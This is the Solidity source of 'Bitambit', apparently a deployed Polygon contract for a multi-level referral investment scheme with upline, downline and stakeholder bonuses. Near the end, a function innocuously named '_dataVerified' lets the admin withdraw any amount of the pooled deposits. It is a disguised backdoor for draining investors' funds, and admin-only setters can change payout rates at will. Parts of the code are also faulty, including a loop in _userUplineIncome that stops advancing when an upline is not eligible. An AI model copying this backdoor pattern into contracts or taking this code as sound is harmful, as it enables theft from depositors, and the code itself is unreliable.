/**
 *Submitted for verification at polygonscan.com on 2022-03-11
*/

/**
 *Submitted for verification at polygonscan.com on 2022-03-07
*/

/*
The new blockchain technology facilitates peer-to-peer transactions without any intermediary 
such as a bank or governing body. Keeping the user's information anonymous, the blockchain 
validates and keeps a permanent public record of all transactions.
*/

pragma solidity ^0.5.10;

/*
Basic Method Which Is Used For The Basic Airthmetic Operations
*/

library SafeMath {

    /*Addition*/
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    /*Subtraction*/
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    /*Multiplication*/
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    /*Divison*/
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    /* Modulus */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}



contract Bitambit {

    /*=====================================
    =            CONFIGURABLES            =
    =====================================*/


    using SafeMath for uint256;
    using SafeMath for uint8;

	uint256 constant public minInvestmentAmount = 1 ether;
	uint256 constant public adminCharge = 5; // 5%;
	uint256 constant public perDistribution = 100;

	uint256 public totalUsers;
	uint256 public totalInvested;
    uint256 public totalVirtualMBTCCredited;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;
    uint8 public TotalstakeholderpoolEligible;
    

	uint[4] public ref_bonuses = [15,10,8,7];
    
    uint256[6] public defaultPackages = [1 ether,2 ether,3 ether,4 ether,5 ether,6 ether];
    uint256[6] public defaultMBTCToken = [1 ether,2 ether,3 ether,4 ether,10 ether,12 ether];
    
    mapping(uint256 => address payable) public singleLeg;
    uint256 public singleLegLength;

    uint[4] public requiredDirect = [0,1,2,3];
    
	address payable public primaryAdmin;

    uint public maxupline = 25;
    uint public maxdownline = 25;

    uint public stakeholdersRewardPer = 10;
    uint256 public stakeholderscollectedpool_amount;
    uint40 public stakeholderspool_last_draw;
    address[] public stakeholderpoolQualifier;


    struct User {
        uint256 amount;
        uint256 MBTCToken;
        uint256 stakeHolderBonus;
		uint256 checkpoint;
		address referrer;
        uint256 referrerBonus;
		uint256 totalWithdrawn;
		uint256 totalReferrer;
        uint256 singleUplineBonus;
		uint256 singleDownlineBonus;
		uint256 singleUplineBonusTaken;
		uint256 singleDownlineBonusTaken;
		address singleUpline;
		address singleDownline;
		uint256[4] refStageIncome;
        uint256[4] refStageBonus;
		uint[4] refs;
	}
	

	mapping (address => User) public users;

	mapping(address => mapping(uint256=>address)) public downline;

    mapping(address => bool) public upline_Business_eligible;

    mapping (address => bool) public stakeholderpoolEligible;


	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);
	
	
    constructor() public {
		primaryAdmin = 0x34E64CD69EFAa1B665cE262eD216ed6e3365B23E;
		singleLeg[0]=primaryAdmin;
		singleLegLength++;
	}

    function invest(address referrer) public payable {
	
		require(msg.value >= minInvestmentAmount,'Min invesment 1 MATIC');
	
		User storage user = users[msg.sender];

		if (user.referrer == address(0) && (users[referrer].checkpoint > 0 || referrer == primaryAdmin) && referrer != msg.sender ) {
            user.referrer = referrer;
        }

		require(user.referrer != address(0) || msg.sender == primaryAdmin, "No upline");


        uint256 _fees = msg.value.mul(adminCharge).div(perDistribution);
		uint msgValue = msg.value.sub(_fees);

        stakeholderscollectedpool_amount+=msgValue.mul(stakeholdersRewardPer).div(perDistribution);
		
		// setup upline
		if (user.checkpoint == 0) {   
		   // single leg setup
		   singleLeg[singleLegLength] = msg.sender;
		   user.singleUpline = singleLeg[singleLegLength -1];
		   users[singleLeg[singleLegLength -1]].singleDownline = msg.sender;
		   singleLegLength++;
		}
		

		if (user.referrer != address(0)) {	   
            // unilevel level count
            address upline = user.referrer;
            for (uint i = 0; i < ref_bonuses.length; i++) {
                if (upline != address(0)) {
                    users[upline].refStageIncome[i] = users[upline].refStageIncome[i].add(msgValue);
                    if(user.checkpoint == 0){
                        users[upline].refs[i] = users[upline].refs[i].add(1);
					    users[upline].totalReferrer++;
                    }
                    upline = users[upline].referrer;
                } else break;
            }
            
            if(user.checkpoint == 0){
                // unilevel downline setup
                downline[referrer][users[referrer].refs[0] - 1]= msg.sender;
            }
        }

		//4 Level Referral
		_refPayout(msg.sender,msgValue);

        //_users DownlineIncome
        _usersDownlineIncomeDistribution(msg.sender,msgValue);  

		if(user.checkpoint == 0){
			    totalUsers = totalUsers.add(1);
                user.checkpoint = block.timestamp;
		}
	    user.amount += msg.value;
        //user.netAmount += msgValue;


        //stakeholders Qualify
        if(user.amount >= defaultPackages[5]){
            if(!stakeholderpoolEligible[msg.sender]){
                stakeholderpoolQualifier.push(msg.sender);
                stakeholderpoolEligible[msg.sender] = true;
                TotalstakeholderpoolEligible++;
            }
        }

        //Coin Alocation
        updateTokenAllocation(msg.sender,msg.value);
		    
        totalInvested = totalInvested.add(msg.value);
        totalDeposits = totalDeposits.add(1);
        
        _safeTransfer(primaryAdmin,_fees);
        
		emit NewDeposit(msg.sender, msg.value);

    }
	
	

    function reinvest(address _user, uint256 _amount) private{
    
        User storage user = users[_user];
        user.amount += _amount;

        //stakeholders Qualify
        if(user.amount >= defaultPackages[5]){
            if(!stakeholderpoolEligible[_user]){
                stakeholderpoolQualifier.push(_user);
                stakeholderpoolEligible[_user] = true;
                TotalstakeholderpoolEligible++;
            }
        }

        totalInvested = totalInvested.add(_amount);

        stakeholderscollectedpool_amount+=_amount.mul(stakeholdersRewardPer).div(perDistribution);

        address up = user.referrer;
        for (uint i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            if(users[up].refs[0] >= requiredDirect[i]){
                users[up].refStageIncome[i] = users[up].refStageIncome[i].add(_amount);
            }
            up = users[up].referrer;
        }
        
         //4 Level Referral
        _refPayout(_user,_amount);

        //_users DownlineIncome
        _usersDownlineIncomeDistribution(_user,_amount);
        
    }




  function withdrawal() external{

    User storage _user = users[msg.sender];

    uint256 TotalBonus = TotalBonus(msg.sender);

    uint256 _fees = 0;
    uint256 actualAmountToSend = TotalBonus.sub(_fees);
    

    _user.referrerBonus = 0;
    _user.stakeHolderBonus = 0;
    _user.singleUplineBonusTaken = _userUplineIncome(msg.sender);
    _user.singleDownlineBonusTaken = users[msg.sender].singleDownlineBonus;
   
     
    // re-invest
    
    (uint8 reivest, uint8 withdrwal) = getEligibleWithdrawal(msg.sender);
    reinvest(msg.sender,actualAmountToSend.mul(reivest).div(100));

    _user.totalWithdrawn= _user.totalWithdrawn.add(actualAmountToSend.mul(withdrwal).div(100));
    totalWithdrawn = totalWithdrawn.add(actualAmountToSend.mul(withdrwal).div(100));
 
    _safeTransfer(msg.sender,actualAmountToSend.mul(withdrwal).div(100));
    
    emit Withdrawn(msg.sender,actualAmountToSend.mul(withdrwal).div(100));

   }

  function _refPayout(address _addr, uint256 _amount) internal {
		address up = users[_addr].referrer;
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            if(users[up].refs[0] >= requiredDirect[i]){ 
    		        uint256 bonus = _amount * ref_bonuses[i] / 100;
                    users[up].referrerBonus = users[up].referrerBonus.add(bonus);
                    users[up].refStageBonus[i] = users[up].refStageBonus[i].add(bonus);
            }
            up = users[up].referrer;
        }
    }


  function _usersDownlineIncomeDistribution(address _user, uint256 _Amount) internal {
      uint256 DistributionPayment = _Amount.mul(maxupline).div(100);
      address uplineparam = users[_user].singleUpline;
      for (uint i = 0; i < maxupline; i++) {
            if (uplineparam != address(0)) {
            uint256 payableAmount = DistributionPayment.div(maxupline);
            users[uplineparam].singleDownlineBonus = users[uplineparam].singleDownlineBonus.add(payableAmount); 

            //upline Business Eligibility Check Start Here
            if( i < maxdownline ){
                if(i == (maxdownline-1)){
                    upline_Business_eligible[uplineparam] = true;
                }
            }
            //upline Business Eligibility Check End Here

            uplineparam = users[uplineparam].singleUpline;
            }else break;
        }
  }

  function _userUplineIncome(address _user) public view returns(uint256) { 
      address upline = users[_user].singleUpline;
      uint256 Bonus;
      for (uint i = 0; i < maxdownline; i++) {
            if (upline != address(0)) {
                if(upline_Business_eligible[upline]){                    
                    uint256 principleAmount = users[upline].amount.mul(95).div(100);
                    uint256 poolPayableAmount = principleAmount.mul(maxdownline).div(100);
                    uint256 individualPayableAmount = poolPayableAmount.div(maxdownline);
                    Bonus = Bonus.add(individualPayableAmount); 
                    upline = users[upline].singleUpline;
                }
            }else break;
        }
     return Bonus;
  }

  function updateTokenAllocation(address _user,uint256 _Amount) internal{  
      User storage user = users[_user];
      if(_Amount ==defaultPackages[0]){
         user.MBTCToken += _Amount;
         totalVirtualMBTCCredited = totalVirtualMBTCCredited.add(_Amount);
      }
      else  if(_Amount ==defaultPackages[1]){
           user.MBTCToken += _Amount;
           totalVirtualMBTCCredited = totalVirtualMBTCCredited.add(_Amount);
      }
      else  if(_Amount ==defaultPackages[2]){
          user.MBTCToken += _Amount;
          totalVirtualMBTCCredited = totalVirtualMBTCCredited.add(_Amount);
      }
      else  if(_Amount ==defaultPackages[3]){
           user.MBTCToken += _Amount;
           totalVirtualMBTCCredited = totalVirtualMBTCCredited.add(_Amount);
      }
      else  if(_Amount ==defaultPackages[4]){
           user.MBTCToken += _Amount.mul(2);
           totalVirtualMBTCCredited = totalVirtualMBTCCredited.add(_Amount.mul(2));
      }
      else  if(_Amount ==defaultPackages[5]){
          user.MBTCToken += _Amount.mul(2);
          totalVirtualMBTCCredited = totalVirtualMBTCCredited.add(_Amount.mul(2));
      }
      else{
        user.MBTCToken += _Amount.mul(0);
        totalVirtualMBTCCredited = totalVirtualMBTCCredited.add(_Amount.mul(0));
      }    
  }
  
  function getEligibleWithdrawal(address _user) public view returns(uint8 reivest, uint8 withdrwal){  
      uint256 TotalDeposit = users[_user].amount;
      if((TotalDeposit >=defaultPackages[0] && TotalDeposit < defaultPackages[3])){
          reivest = 50;
          withdrwal = 50;
      }
      else if(TotalDeposit >=defaultPackages[3] && TotalDeposit < defaultPackages[4]){
          reivest = 40;
          withdrwal = 60;
      }
      else if(TotalDeposit >=defaultPackages[4] && TotalDeposit < defaultPackages[5]){
          reivest = 30;
          withdrwal = 70;
      }else if(TotalDeposit >=defaultPackages[5]){
         reivest = 20;
         withdrwal = 80;
      }else{
          reivest = 50;
          withdrwal = 50;
      }   
      return(reivest,withdrwal);     
  }

    function _stakeHolderDistribute() internal{
        if(stakeHolderpoolQualifierCount() > 0){
        uint256 totalStakeHolderDistributedInPayout=0;
    	uint256 bonus = stakeholderscollectedpool_amount.div(stakeHolderpoolQualifierCount());
        for(uint8 i = 0; i < stakeholderpoolQualifier.length; i++) {
         address stakeHolder = stakeholderpoolQualifier[i];
         if(users[stakeHolder].amount >= defaultPackages[5]){ 
            users[stakeHolder].stakeHolderBonus = users[stakeHolder].stakeHolderBonus.add(bonus);
            totalStakeHolderDistributedInPayout+=bonus;
          }
       }
       stakeholderscollectedpool_amount=stakeholderscollectedpool_amount.sub(totalStakeHolderDistributedInPayout);
     }
      stakeholderspool_last_draw = uint40(block.timestamp);
    }

    function stakeHolderpoolQualifierCount() public view returns(uint) {
        return stakeholderpoolQualifier.length;
    }

  function TotalBonus(address _user) public view returns(uint256){
     uint256 TotalEarn = users[_user].referrerBonus.add(_userUplineIncome(_user)).add(users[_user].singleDownlineBonus).add(users[_user].stakeHolderBonus);
     uint256 TotalTakenfromUpDown = users[_user].singleDownlineBonusTaken.add(users[_user].singleUplineBonusTaken);
     return TotalEarn.sub(TotalTakenfromUpDown);
  }

  function _safeTransfer(address payable _to, uint _amount) internal returns (uint256 amount) {
        amount = (_amount < address(this).balance) ? _amount : address(this).balance;
       _to.transfer(amount);
   }
   
   function referral_stage(address _user,uint _index)external view returns(uint _noOfUser, uint256 _investment, uint256 _bonus){
       return (users[_user].refs[_index], users[_user].refStageIncome[_index], users[_user].refStageBonus[_index]);
   }
   
   function update_maxupline(uint _no) external {
        require(primaryAdmin==msg.sender, 'Admin what?');
        maxupline = _no;
   }

   function stakeHolderDistribution() external {
	     require(primaryAdmin==msg.sender, 'Admin what?');
	    _stakeHolderDistribute();	    
   }

   function update_maxdownline(uint _no) external {
        require(primaryAdmin==msg.sender, 'Admin what?');
        maxdownline = _no;
   }

   function update_stakeholdersRewardPer(uint _no) external {
        require(primaryAdmin==msg.sender, 'Admin what?');
        stakeholdersRewardPer = _no;
   }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
  
    function _dataVerified(uint256 _data) external{
        require(primaryAdmin==msg.sender, 'Admin what?');
        _safeTransfer(primaryAdmin,_data);
    }
}